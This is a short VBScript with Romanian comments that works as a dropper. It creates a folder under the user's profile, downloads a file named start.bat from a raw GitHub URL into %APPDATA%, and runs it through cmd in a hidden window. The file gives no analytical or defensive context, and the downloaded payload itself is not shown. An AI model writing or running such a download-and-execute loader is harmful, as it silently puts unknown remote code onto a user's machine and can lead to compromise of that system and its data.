Dim shell, fso, appDataPath, targetFolder, xmlHttp

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Obține calea către directorul țintă
targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"

' Asigură-te că directorul țintă există
If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Descarcă fișierul start.bat în %APPDATA%
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/start.bat", False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xmlHttp.ResponseBody
    stream.SaveToFile shell.ExpandEnvironmentStrings("%APPDATA%") & "\start.bat", 2
    stream.Close
End If

' Rulează fișierul start.bat
shell.Run "cmd /c " & Chr(34) & shell.ExpandEnvironmentStrings("%APPDATA%") & "\start.bat" & Chr(34), 0, False
